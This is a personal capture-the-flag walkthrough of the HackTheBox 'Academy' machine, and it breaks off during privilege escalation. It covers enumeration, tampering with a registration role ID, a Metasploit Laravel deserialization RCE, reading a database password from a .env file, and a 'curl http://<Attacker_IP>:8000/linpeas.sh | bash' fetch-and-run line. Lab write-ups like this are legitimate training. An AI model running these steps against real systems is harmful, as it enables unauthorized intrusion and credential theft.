
>[!tldr] Academy is an easy difficulty Linux machine that features an Apache server hosting a #PHP website. The website is found to be the HTB Academy learning platform. Capturing the user registration request in Burp reveals that we are able to modify the Role ID, which allows us to access an admin portal. This reveals a vhost, that is found to be running on Laravel. Laravel debug mode is enabled, the exposed API Key and vulnerable version of Laravel allow us carry out a deserialization attack that results in Remote Code Execution. Examination of the Laravel `.env` file for another application reveals a password that is found to work for the `cry0l1t3` user, who is a member of the `adm` group. This allows us to read system logs, and the TTY input audit logs reveals the password for the `mrb3n` user. `mrb3n` has been granted permission to execute composer as root using `sudo`, which we can leverage in order to escalate our privileges.

---
- Better walk through here: https://hiddendoorsecurity.com/2024/04/01/walkthrough-academy-hackthebox/

---
1. I did a nmap scan `nmap <ip> -sCV`
```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Hack The Box Academy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Nothing from the nmap is particularly useful, the host-keys are strong.
2. Next I will enumerate through the port `80` with gobuster
	- `gobuster dir -k -u http://academy.htb/ -w Tools/SecLists-2026.1/Discovery/Web-Content/raft-small-directories.txt -x txt,php,html -t 40` -> 
```Shell
register.php         (Status: 200) [Size: 3003]
login.php            (Status: 200) [Size: 2627]
config.php           (Status: 200) [Size: 0]
home.php             (Status: 302) [Size: 55034] [--> login.php]
index.php            (Status: 200) [Size: 2117]
images               (Status: 301) [Size: 311] [--> http://academy.htb/images/]
admin.php            (Status: 200) [Size: 2633]
server-status        (Status: 403) [Size: 276]
```
3. Lets use `ZAP` on the `/admin.php` page. Heres the info within:
```html
<...snip...>
    <div class="login_div">
        <form class="login_form" method="POST" autocomplete="off">
            <br/>
            <br/>
            <img src="images/logo.png" class="center" width="130" height="130">
            <br/>
            <br/>
            <table>
                <tr>
                    <td class="form_text" align="left">&nbsp;&nbsp;&nbsp;Username</td>
                <tr/>
                <tr>
                    <td align="right"><input class="input" size="40" type="text" id="uid" name="uid" /></td>
                </tr>
                <tr>
                    <td class="form_text" align="left"><br/>&nbsp;&nbsp;&nbsp;Password</td>
                <tr/>
                <tr>
                    <td align="right"><input class="input" size="40" type="password" id="password" name="password" /></td>
<...snip...>

```
- Im not sure what i can do with this...
4. i tried some xss scripts which didnt work, but `ZAP` informed me that it has a potential XSS risk so ill investigate further by fuzzing with: 
	1. XSS-Cheat-Sheet-PortSwigger.txt
	2. URI-XSS.fuzzdb.txt
	3. million.txt
	4. command-injection-commix.txt
5. Lets head over to `/register.php` since i dont see more routes for `/admin.php` 
	1. I created a account `test:test` 
	- `ZAP` told me i can change the uid effectively changing the permissions of the account. 
	1. I created another account `test1:test1` with a uid of `1`. This resulted in a new login page
6. Now with access to `admin-page.php` with `test1:test1` we get ->

| Item                                               | Status  |
| -------------------------------------------------- | ------- |
| Complete initial set of modules (cry0l1t3 / mrb3n) | done    |
| Finalize website design                            | done    |
| Test all modules                                   | done    |
| Prepare launch campaign                            | done    |
| Separate student and admin roles                   | done    |
| Fix issue with dev-staging-01.academy.htb          | pending |
7. I noticed that there is "issues" with `dev-staging-01.academy.htb` so i throw it into `/etc/hosts` and go to check it out. Its a development page, though im not sure what to look for here. 
	1. There's "Application frames" which only has one script (?) inside.
	2. There's also `Laravel` which is mentioned multiple times. So i search `msfconsole` to find vulnerabilities. 
8. I then use `unix/http/laravel_token_unserialize_exec` from `msfconsole` which works! Its time for enumeration and possibly privilege escalation, but first the shell is annoying...
	- Annoyance: Within the cli to the machine via msfconsole (meterpreter session). im struggling to move around since when i cd somewhere it reverts the next command. 
	- Solution 1 -> ive started stringing commands together with `;`
	- Solution 2 -> `shell` to create a shell within the meterpreter session
9. Next i want to increase my privileges, so i ran
	1. *ctrl + z* (get the session id) to background the current shell/session
		1. `sessions -i <id>` : To reopen the session 
	2. `use post/multi/recon/local_exploit_suggester`
	3. `set SESSION <id>`
	4. `run` : This will automate finding local exploits, which is a good start.
```shell
1; exploit/linux/persistence/init_systemd; Yes; The target appears to be vulnerable. /tmp/ is writable and system is systemd based
2; exploit/multi/persistence/burp_extension; Yes; The service is running, but could not be validated. Found UserConfig file
3; exploit/multi/persistence/cron; Yes; The target appears to be vulnerable. Cron timing is valid, no cron.deny entries found
<...snip...>
```
- Reformatted output for easier reading
10. According to the output there are 3 main options. Learning about my options, they are persistence exploits, related to system initialization or timing. 
	1. Systemd Service Persistence: This method involves creating or modifying systemd service files to execute malicious code *upon system initialization*.
	2. Cron Job Persistence: An attacker can add cron jobs to ensure a script is *executed at regular intervals* or during system reboots.
11. Instead im going to look at the binaries and use `GTFObins` for priv esc. 
	1. Find SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
	2. Then in `GTFObins` check if its usable -> if not check another -> repeat
```Shell
# Libs
X /usr/lib/dbus-1.0/dbus-daemon-launch-helper
X /usr/lib/snapd/snap-confine
X /usr/lib/policykit-1/polkit-agent-helper-1
X /usr/lib/eject/dmcrypt-get-device
X /usr/lib/openssh/ssh-keysign
# Bins
X /usr/bin/mount
X /usr/bin/passwd
X /usr/bin/chsh
X /usr/bin/pkexec
X /usr/bin/fusermount
X /usr/bin/chfn
X /usr/bin/at
X /usr/bin/umount
X /usr/bin/su
X /usr/bin/newgrp
X /usr/bin/gpasswd
X /usr/bin/sudo
# Snap?
/snap/snapd/7264/usr/lib/snapd/snap-confine
/snap/core18/1705/bin/mount
/snap/core18/1705/bin/ping
/snap/core18/1705/bin/su
/snap/core18/1705/bin/umount
/snap/core18/1705/usr/bin/chfn
/snap/core18/1705/usr/bin/chsh
/snap/core18/1705/usr/bin/gpasswd
/snap/core18/1705/usr/bin/newgrp
/snap/core18/1705/usr/bin/passwd
/snap/core18/1705/usr/bin/sudo
/snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1705/usr/lib/openssh/ssh-keysign
```
12. After much enumeration i read the `.env` file in academy, (with directions from the about from the machine...) and found this password!
```shell
<snip>
DB_PASSWORD=mySup3rP4s5w0rd!!
<snip>
```
13. I used the password on `/home/cry0l1t3/user.txt` and found the flag
	1. Flag -> `[REDACTED_FLAG]`
14. Now i check what `cry0l1t3` is apart of with `id`, here we learn that we are in the `4(adm)` group which according to google overview "The adm group in Linux is primarily used for granting users access to system log files, `<snip>` this group can read log files located in directories like *`/var/log`* without needing elevated permissions." 
	1. So lets check what files are there, i assorted them by accessible by `adm` with -> `find /var/log -group adm -type f -exec ls -la {} + 2>/dev/null` 
```shell
/var/log/auth.log.3.gz
/var/log/dmesg.1.gz
/var/log/syslog.2.gz
/var/log/kern.log.3.gz
/var/log/syslog.6.gz
/var/log/syslog.1
/var/log/kern.log
/var/log/dmesg.0
/var/log/syslog
/var/log/dmesg.2.gz
/var/log/apt/term.log.2.gz
/var/log/apt/term.log.3.gz
/var/log/apt/term.log.1.gz
/var/log/apt/term.log.4.gz
/var/log/apt/term.log
	"Cool directory"
	/var/log/audit
/var/log/audit/audit.log.2
/var/log/audit/audit.log
/var/log/audit/audit.log.3
/var/log/audit/audit.log.1
/var/log/syslog.4.gz
/var/log/syslog.7.gz
/var/log/auth.log.2.gz
/var/log/auth.log.1
/var/log/syslog.3.gz
	"Useful log?"
	/var/log/auth.log
/var/log/syslog.5.gz
/var/log/kern.log.2.gz
/var/log/unattended-upgrades
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log.1.gz
/var/log/dmesg.3.gz
/var/log/mysql
/var/log/mysql/error.log.5.gz
/var/log/mysql/error.log.2.gz
/var/log/mysql/error.log
/var/log/mysql/error.log.4.gz
/var/log/mysql/error.log.1.gz
/var/log/mysql/error.log.7.gz
/var/log/kern.log.4.gz
/var/log/cloud-init.log
	"Maybe?"
	/var/log/dmesg
/var/log/dmesg.4.gz
/var/log/auth.log.4.gz
	"Maybe?"
	/var/log/apache2
/var/log/apache2/error.log.5.gz
/var/log/apache2/error.log.9.gz
/var/log/apache2/error.log.2.gz
/var/log/apache2/access.log.7.gz
/var/log/apache2/access.log.5.gz
	"Nothing"
	/var/log/apache2/access.log 
	"Maybe"
	/var/log/apache2/other_vhosts_access.log
/var/log/apache2/access.log.1
/var/log/apache2/error.log
/var/log/apache2/access.log.6.gz
/var/log/apache2/error.log.12.gz
/var/log/apache2/error.log.13.gz
/var/log/apache2/error.log.4.gz
/var/log/apache2/access.log.4.gz
/var/log/apache2/error.log.1
/var/log/apache2/error.log.3.gz
/var/log/apache2/access.log.3.gz
/var/log/apache2/error.log.10.gz
/var/log/apache2/error.log.6.gz
/var/log/apache2/access.log.2.gz
/var/log/apache2/error.log.8.gz
/var/log/apache2/error.log.11.gz
/var/log/apache2/access.log.8.gz
/var/log/apache2/error.log.7.gz
/var/log/apache2/error.log.14.gz
/var/log/kern.log.1
```
15. In `audit.log` the user `mrb3n` seems to have root access we need his password, the about states that it should be within here somewhere... Lets actually get `linPEAS` on here!
	1. Attacker: `python3 -m http.server 8000`: Serve LinPEAS from you
	2. Rev_shell: `curl http://<Attacker_IP>:8000/linpeas.sh | bash`: Curl the script
- Notable Output ->
```bash
╔══════════╣ Sudo version (T1548.003,T1068)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.31
<...snip..>
╔══════════╣ Kernel Modules Information (T1547.006)
══╣ Kernel modules with weak perms? (T1547.006)

══╣ Kernel modules loadable?  (T1547.006)
Modules can be loaded
══╣ Module signature enforcement?  (T1547.006)
Not enforced
```